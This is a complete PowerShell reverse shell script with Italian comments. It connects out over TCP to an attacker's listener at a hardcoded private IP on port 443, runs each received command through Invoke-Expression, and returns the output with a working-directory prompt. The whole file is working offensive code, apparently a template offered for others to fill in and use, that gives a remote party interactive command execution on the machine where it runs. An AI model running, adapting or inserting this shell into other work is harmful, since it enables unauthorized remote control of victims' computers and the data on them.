<#
.SYNOPSIS
    Interactive PowerShell Reverse Shell via .NET Sockets.
.DESCRIPTION
    Establishes a stable TCP connection to a remote listener. 
    Handles command execution in a persistent loop and provides real-time directory feedback.
.NOTES
    Author: [Il Tuo Nome/GitHub Handle]
    Version: 1.1
#>

# Attaccante: IP e Porta (Modificare per il proprio ambiente)
$LHOST = "192.168.23.128"
$LPORT = 443

Write-Host "[*] Establising connection to ${LHOST}:${LPORT}..." -ForegroundColor Cyan

try {
    # Creazione del socket TCP e recupero dello stream di rete
    $client = New-Object System.Net.Sockets.TCPClient($LHOST, $LPORT)
    $stream = $client.GetStream()
    
    # Allocazione di un buffer da 64KB per gestire flussi di dati voluminosi
    [byte[]]$buffer = 0..65535 | ForEach-Object { 0 }

    Write-Host "[+] Session active. Ready for commands." -ForegroundColor Green

    # Loop di ricezione: continua finché il socket è aperto
    while (($readLength = $stream.Read($buffer, 0, $buffer.Length)) -ne 0) {
        
        # Decodifica dei byte ricevuti in testo ASCII
        $receivedData = [System.Text.Encoding]::ASCII.GetString($buffer, 0, $readLength)
        
        # Esecuzione dinamica del comando. L'uso di try-catch previene la chiusura della shell 
        # in caso di errori di sintassi o comandi non trovati.
        $output = try {
            Invoke-Expression $receivedData 2>&1 | Out-String
        } catch {
            "Error: " + $_.Exception.Message + "`n"
        }

        # Generazione del prompt interattivo con il percorso attuale (PWD)
        $currentPath = "PS " + (Get-Location).Path + "> "
        $response = $output + $currentPath
        
        # Conversione della risposta in byte e invio attraverso il socket
        $sendBytes = [System.Text.Encoding]::ASCII.GetBytes($response)
        $stream.Write($sendBytes, 0, $sendBytes.Length)
        $stream.Flush()
    }
}
catch {
    Write-Host "[!] Network error: $($_.Exception.Message)" -ForegroundColor Red
}
finally {
    # Assicura la chiusura corretta delle risorse al termine della sessione
    if ($client) { $client.Close() }
    Write-Host "[*] Connection terminated." -ForegroundColor Yellow
}